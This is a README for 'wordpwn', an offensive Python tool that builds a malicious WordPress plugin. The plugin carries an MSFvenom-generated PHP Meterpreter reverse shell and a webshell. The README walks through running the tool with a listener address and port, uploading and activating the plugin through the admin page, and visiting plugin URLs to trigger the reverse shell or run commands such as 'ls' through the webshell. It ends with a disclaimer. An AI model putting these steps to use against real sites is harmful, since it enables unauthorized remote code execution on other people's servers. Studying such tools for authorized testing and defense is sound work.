# Malicious WordPress plugin

This utility simply generates a WordPress plugin that will grant you a reverse shell once uploaded. I recommend installing Kali Linux, as MSFvenom is used to generate the payload.

It goes without mentioning that in order for this method to be effective, you must have credentials to a
valid User account, with rights to add plugins to the WordPress website ;)

## Usage Example
```sh
root@wetw0rk:~# python wordpwn.py
__        __            _
\ \      / /__  _ __ __| |_ ____      ___ __
 \ \ /\ / / _ \|  __/ _  |  _ \ \ /\ / /  _ \
  \ V  V / (_) | | | (_| | |_) \ V  V /| | | |
   \_/\_/ \___/|_|  \__,_| .__/ \_/\_/ |_| |_|
                         |_|


Usage: wordpwn.py [LHOST] [LPORT] [HANDLER]
Example: wordpwn.py 192.168.0.6 8888 Y
```

## How and When do I use this?

Usage is super simple, simply pass wordpwn your listening address and listening port and execute the script. You are also given the option to start a handler, I recommend that you do... since by default the plugin will be made using a `php/meterpreter/reverse_tcp` reverse shell.If you have your own nefarious PHP payload simply adjust the script to accept it.

After the script is ran, a zip file (the plugin) called `malicious.zip` will be created in the current directory (and a handler will be started if you specified it with the `Y` option).
Upload this zip file as a new plugin (by browsing to the URL `http://(target)/wp-admin/plugin-install.php?tab=upload`).
Once uploaded, you have to activate the plugin.

Be sure to start our listener (if you didn't specify the handler with the `Y` option) !
If reverse shell connection doesn't hang there is a webshell uploaded which can be accessed.

Once the plugin installed and activated, just navigate to the following URLs to launch the reverse shell or the webshell :
 - http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php
 - http://(target)/wp-content/plugins/malicious/QwertyRocks.php
 - http://(target)/wp-content/plugins/malicious/SWebTheme.php?cmd=ls  (Webshell with list directory command)


**Note:** if the script usage is still a mystery to you, [JavaRockstar](https://github.com/JavaRockstar) has made a tutorial on his website [HackingVision](https://hackingvision.com/2017/04/11/hacking-wordpress-website-malicious-plug/) about it.


## PLEASE READ
I want to be 100% sure that I give credit to [Rob Carr](https://www.rastating.com/). Rob Carr is the author of the Metasploit module `wp_admin_shell_upload`, which this script is based on. You can find more information on his module at [Rapid7](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload) .

## DISCLAIMER
I'm not responsible for any bad use case, use this script at your own risks, do not use it for any illegal/unethical purposes.
